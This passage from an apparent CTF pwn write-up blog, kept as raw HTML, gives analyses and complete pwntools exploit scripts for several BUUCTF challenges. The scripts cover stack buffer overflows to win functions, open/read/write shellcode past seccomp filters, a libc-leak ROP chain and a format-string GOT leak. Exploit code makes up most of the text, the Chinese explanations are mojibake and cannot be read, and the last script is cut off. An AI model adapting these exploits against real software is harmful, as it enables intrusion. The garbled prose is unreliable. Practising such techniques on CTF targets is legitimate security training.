href="#exp-4" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./PicoCTF_2018_rop_chain'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>remote_libc = local_libc <span class="hljs-comment"># './libc.so.6'</span>context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29550</span>)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>] <span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = []realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()win_function1 = <span class="hljs-number">0x080485CB</span>win_function2 = <span class="hljs-number">0x80485D8</span>flag = <span class="hljs-number">0x0804862B</span>offset = <span class="hljs-number">0x18</span> + <span class="hljs-number">4</span>ru(<span class="hljs-string">'Enter your input&gt;'</span>)payload = <span class="hljs-string">'a'</span> * offset + flat([win_function1,win_function2,flag,<span class="hljs-number">0xBAAAAAAD</span>,<span class="hljs-number">0xDEADBAAD</span>])<span class="hljs-comment"># debug()</span>s(payload + <span class="hljs-string">'\n'</span>)itr()</code></pre></div><h2 id="pwnable-orw"><a href="#pwnable-orw" class="headerlink" title="pwnable_orw"></a><code>pwnable_orw</code></h2><h3 id="åˆ†æ-5"><a href="#åˆ†æ-5" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>è€ƒç‚¹ ï¼š</p><ul><li>ç®€å•shellcode çš„ç¼–å†™</li><li>seccompï¼ˆæŒ–å‘ï¼‰</li></ul><p><a href="https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></p><p><a href="https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/" target="_blank" rel="noopener">https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/</a></p><p><img src="http://qiqianyun.chumen77.xyz/uPic/P0Ku7D.png" srcset="/img/loading.gif" alt></p><p>å…ˆç”¨<code>seccomp-tools</code>çœ‹ä¸‹ç¦ç”¨äº†ä»€ä¹ˆå‡½æ•°ï¼š</p><div class="hljs"><pre><code class="hljs undefined">âœ  pwnable_orw seccomp-tools dump ./orw line  CODE  JT   JF      K================================= <span class="hljs-number">0000</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  A = arch <span class="hljs-number">0001</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x09</span> <span class="hljs-number">0x40000003</span>  <span class="hljs-keyword">if</span> (A != ARCH_I386) goto <span class="hljs-number">0011</span> <span class="hljs-number">0002</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  A = sys_number <span class="hljs-number">0003</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x07</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x000000ad</span>  <span class="hljs-keyword">if</span> (A == rt_sigreturn) goto <span class="hljs-number">0011</span> <span class="hljs-number">0004</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000077</span>  <span class="hljs-keyword">if</span> (A == sigreturn) goto <span class="hljs-number">0011</span> <span class="hljs-number">0005</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x05</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x000000fc</span>  <span class="hljs-keyword">if</span> (A == exit_group) goto <span class="hljs-number">0011</span> <span class="hljs-number">0006</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x04</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000001</span>  <span class="hljs-keyword">if</span> (A == exit) goto <span class="hljs-number">0011</span> <span class="hljs-number">0007</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x03</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000005</span>  <span class="hljs-keyword">if</span> (A == open) goto <span class="hljs-number">0011</span> <span class="hljs-number">0008</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x02</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000003</span>  <span class="hljs-keyword">if</span> (A == read) goto <span class="hljs-number">0011</span> <span class="hljs-number">0009</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  <span class="hljs-keyword">if</span> (A == write) goto <span class="hljs-number">0011</span> <span class="hljs-number">0010</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00050026</span>  <span class="hljs-keyword">return</span> ERRNO(<span class="hljs-number">38</span>) <span class="hljs-number">0011</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW</code></pre></div><p>æ˜æ˜¾åªèƒ½æ‰§è¡Œ open read wirte å‡½æ•°ã€‚</p><div class="hljs"><pre><code class="hljs undefined">#è¿™é‡Œå¯ä»¥ç”¨pwntoolsåº“çš„ä¸€ä¸ªå‡½æ•°ä»£æ›¿,shellcraftcè¯­è¨€:<span class="hljs-built_in">open</span>(<span class="hljs-string">"/home/orw/flag"</span>) &lt;==&gt; æ±‡ç¼–:<span class="hljs-keyword">asm</span>(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">"/home/orw/flag"</span>))cè¯­è¨€:<span class="hljs-built_in">read</span>(<span class="hljs-number">3</span>,buf,<span class="hljs-number">0x20</span>)&lt;==&gt; æ±‡ç¼–:<span class="hljs-keyword">asm</span>(shellcraft.<span class="hljs-built_in">read</span>(<span class="hljs-number">3</span>,<span class="hljs-string">"esp"</span>,<span class="hljs-number">0x20</span>)cè¯­è¨€:<span class="hljs-built_in">write</span>(<span class="hljs-number">1</span>,buf,<span class="hljs-number">0x20</span>)&lt;==&gt;æ±‡ç¼–:<span class="hljs-keyword">asm</span>(shellcraft.<span class="hljs-built_in">write</span>(<span class="hljs-number">1</span>,<span class="hljs-string">"esp"</span>,<span class="hljs-number">0x20</span>))</code></pre></div><p>å…¶ä¸­ å°±æ˜¯ä»¥espå½“åšä¸´æ—¶å˜é‡ bufçš„åœ°å€ï¼Œå…¶å¯ä»¥è‡ªå®šä¹‰ã€‚</p><p>å…¶ä¸­openå‡½æ•°æ‰§è¡Œåï¼Œç”±äºæ˜¯æ‰“å¼€äº†ä¸€ä¸ªæ–°çš„æ–‡ä»¶ï¼Œå…¶è¿”å›çš„fdå°±æ˜¯3ï¼Œæ‰€ä»¥åé¢è·Ÿç€çš„readçš„æ–‡ä»¶æè¿°ç¬¦ä¹Ÿä¸º3ã€‚</p><h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./orw'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>remote_libc = local_libc <span class="hljs-comment"># './libc.so.6'</span>context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26224</span>)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = []realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()bss = <span class="hljs-number">0x804A128</span> - <span class="hljs-number">0x30</span>payload= asm(shellcraft.open(<span class="hljs-string">"./flag"</span>))payload += asm(shellcraft.read(<span class="hljs-number">3</span>,bss,<span class="hljs-number">0x30</span>))payload += asm(shellcraft.write(<span class="hljs-number">1</span>,bss,<span class="hljs-number">0x30</span>))sl(payload)itr()</code></pre></div><h2 id="V-amp-N2020-å…¬å¼€èµ›warmup"><a href="#V-amp-N2020-å…¬å¼€èµ›warmup" class="headerlink" title="V&amp;N2020 å…¬å¼€èµ›warmup"></a>V&amp;N2020 å…¬å¼€èµ›warmup</h2><h3 id="åˆ†æ-6"><a href="#åˆ†æ-6" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>å¼€å¯äº†æ²™ç›’ï¼Œä½¿ç”¨orwè·å–flagå³å¯ã€‚</p><div class="hljs"><pre><code class="hljs undefined">Here <span class="hljs-keyword">is</span> my gift: <span class="hljs-number">0x7f411f85c9c0</span> line  CODE  JT   JF      K================================= <span class="hljs-number">0000</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  A = arch <span class="hljs-number">0001</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x09</span> <span class="hljs-number">0xc000003e</span>  <span class="hljs-keyword">if</span> (A != ARCH_X86_64) goto <span class="hljs-number">0011</span> <span class="hljs-number">0002</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  A = sys_number <span class="hljs-number">0003</span>: <span class="hljs-number">0x35</span> <span class="hljs-number">0x07</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x40000000</span>  <span class="hljs-keyword">if</span> (A &gt;= <span class="hljs-number">0x40000000</span>) goto <span class="hljs-number">0011</span> <span class="hljs-number">0004</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0000003b</span>  <span class="hljs-keyword">if</span> (A == execve) goto <span class="hljs-number">0011</span> <span class="hljs-number">0005</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x04</span> <span class="hljs-number">0x00000001</span>  <span class="hljs-keyword">if</span> (A != write) goto <span class="hljs-number">0010</span> <span class="hljs-number">0006</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000024</span>  A = count &gt;&gt; <span class="hljs-number">32</span> # write(fd, buf, count) <span class="hljs-number">0007</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x02</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">if</span> (A != <span class="hljs-number">0x0</span>) goto <span class="hljs-number">0010</span> <span class="hljs-number">0008</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000020</span>  A = count # write(fd, buf, count) <span class="hljs-number">0009</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000010</span>  <span class="hljs-keyword">if</span> (A == <span class="hljs-number">0x10</span>) goto <span class="hljs-number">0011</span> <span class="hljs-number">0010</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW <span class="hljs-number">0011</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">return</span> KILL</code></pre></div><p>å…¶ä¸­ï¼Œè¿™é¢˜å› ä¸ºåªæœ‰<code>0x10</code>çš„æº¢å‡ºç©ºé—´ï¼ŒçŒ›çš„ä¸€çœ‹éœ€è¦æ ˆè¿ç§»ï¼Œä½†æ˜¯ä¼šå‘ç°ä¸çŸ¥é“å¾€å“ªé‡Œè¿ç§»ã€‚çœ‹äº†å¸ˆå‚…ä»¬çš„åšå®¢æ‰çŸ¥é“ï¼Œç”±äºç¬¬ä¸€ä¸ªæ ˆç©ºé—´è¾ƒå¤§ï¼Œä¸”ä¸ç¬¬äºŒä¸ªå¯ä»¥æº¢å‡ºçš„æ ˆæ˜¯<strong>ç´§é‚»</strong>çš„ã€‚ç„¶åï¼Œå°±å¯ä»¥åœ¨æº¢å‡ºæ—¶è¦†ç›–ä¸€ä¸‹è¿”å›åœ°å€ï¼Œè¦†ç›–ä¸ºretï¼Œè¿™æ ·å°±å¯ä»¥å¤šä¸€ä¸ªretï¼Œä»è€Œ<strong>æ¥ç€æ‰§è¡Œ</strong>ä¸Šä¸€ä¸ªæ ˆå¸§bufé‡Œé¢æ„é€ çš„ropé“¾ã€‚</p><p>å¹¶ä¸”åœ¨orwä¸­ï¼Œopenå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°æ—¶ä¸€ä¸ªæŒ‡é’ˆåœ°å€(<code>*filename</code>)ï¼Œæ‰€ä»¥éœ€è¦å…ˆreadä¸€ä¸‹flagçš„æ–‡ä»¶ååˆ°ä¸€ä¸ªbufå½“ä¸­ï¼Œç„¶åå†è¿›è¡Œorwã€‚</p><p>Bufçš„å¯»æ‰¾ï¼š<br>åœ¨libcä¸­æ‰¾ä¸€ä¸ªæ²¡æœ‰ç”¨åˆ°çš„åœ°å€æ®µå³å¯ã€‚æ¯”å¦‚<code>__free_hook</code></p><p><img src="http://qiqianyun.chumen77.xyz/uPic/B3tfJG.png" srcset="/img/loading.gif" alt></p><h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./vn_pwn_warmup'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>remote_libc = local_libc <span class="hljs-comment"># './libc.so.6'</span>context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27585</span>)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()ru(<span class="hljs-string">'0x'</span>)libc_base = int(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - libc.sym[<span class="hljs-string">'puts'</span>]info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)pop_rdi = <span class="hljs-number">0x0000000000021102</span> + libc_basepop_rsi = <span class="hljs-number">0x00000000000202e8</span> + libc_basepop_rdx = <span class="hljs-number">0x0000000000001b92</span> + libc_baseopen = libc_base+libc.sym[<span class="hljs-string">'open'</span>]read = libc_base+libc.sym[<span class="hljs-string">'read'</span>]puts = libc_base+libc.sym[<span class="hljs-string">'puts'</span>]buf = libc_base+libc.sym[<span class="hljs-string">'__free_hook'</span>]payload = flat([    pop_rdi,<span class="hljs-number">0</span>,pop_rsi,buf,pop_rdx,<span class="hljs-number">8</span>,read,    pop_rdi,buf,pop_rsi,<span class="hljs-number">0</span>,pop_rdx,<span class="hljs-number">0</span>,open,    pop_rdi,<span class="hljs-number">3</span>,pop_rsi,buf,pop_rdx,<span class="hljs-number">0x30</span>,read,    pop_rdi,buf,puts])sa(<span class="hljs-string">':'</span>,payload)<span class="hljs-comment"># debug()</span>ret = libc_base + <span class="hljs-number">0x0000000000000937</span>payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x78</span> + p64(ret)sa(<span class="hljs-string">'?'</span>,payload)sleep(<span class="hljs-number">1</span>)<span class="hljs-comment"># debug()</span>s(<span class="hljs-string">'./flag\x00\x00'</span>)itr()</code></pre></div><h2 id="picoctf-2018-buffer-overflow-1"><a href="#picoctf-2018-buffer-overflow-1" class="headerlink" title="picoctf_2018_buffer overflow 1"></a><code>picoctf_2018_buffer overflow 1</code></h2><p>ç®€å•çš„æ ˆæº¢å‡ºï¼Œä¸”å­˜åœ¨åé—¨ã€‚</p><h3 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./PicoCTF_2018_buffer_overflow_1'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>remote_libc = local_libc <span class="hljs-comment"># './libc.so.6'</span>context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29988</span>)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()win = <span class="hljs-number">0x080485CB</span>offset = <span class="hljs-number">0x28</span> + <span class="hljs-number">0x4</span>payload = <span class="hljs-string">'a'</span>*offset + p32(win)sa(<span class="hljs-string">':'</span>,payload)itr()</code></pre></div><h2 id="picoctf-2018-buffer-overflow-2"><a href="#picoctf-2018-buffer-overflow-2" class="headerlink" title="picoctf_2018_buffer overflow 2"></a><code>picoctf_2018_buffer overflow 2</code></h2><p>ç±»ä¼¼ä¸Šé¢˜ï¼Œè€ƒä¸ªæ§åˆ¶ä¼ å‚ã€‚</p><h3 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./PicoCTF_2018_buffer_overflow_2'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>remote_libc = local_libc <span class="hljs-comment"># './libc.so.6'</span>context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29988</span>)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()win = <span class="hljs-number">0x80485CB</span>offset = <span class="hljs-number">0x6c</span> + <span class="hljs-number">0x4</span>payload = <span class="hljs-string">'a'</span>*offset + p32(win) + p32(<span class="hljs-number">0xDEADBEEF</span>) + p32(<span class="hljs-number">0xDEADBEEF</span>) + p32(<span class="hljs-number">0xDEADC0DE</span>)s(payload)</code></pre></div><h2 id="axb-2019-fmt32"><a href="#axb-2019-fmt32" class="headerlink" title="axb_2019_fmt32"></a><code>axb_2019_fmt32</code></h2><p>32ä½çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œè€ƒçš„æ˜¯å•æ¬¡printfå¤šæ¬¡å†™å…¥ï¼Œå› ä¸ºæ˜¯32ä½pwntoolsçš„<code>fmtstr_payload</code>æ˜¯ååˆ†å¥½ç”¨çš„ã€‚</p><h3 id="exp-9"><a href="#exp-9" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./axb_2019_fmt32'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>remote_libc = local_libc <span class="hljs-comment"># './libc.so.6'</span>context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29147</span>)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()printf_got = <span class="hljs-number">0x804A014</span>payload = <span class="hljs-string">"%9$sA"</span> + p32(<span class="hljs-number">0x804A014</span>)sla(<span class="hljs-string">'me:'</span>,payload)ru(<span class="hljs-string">'Repeater:'</span>)printf_got = uu32(r(<span class="hljs-number">4</span>))libc_base = printf_got - <span class="hljs-number">0x049020</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)offset = <span class="hljs-number">8</span>rce = libc_base + <span class="hljs-number">0x3a80c</span>info_addr(<span class="hljs-string">'rec'</span>,rce)payload = <span class="hljs-string">'a'</span> + fmtstr_payload(offset,&#123;<span 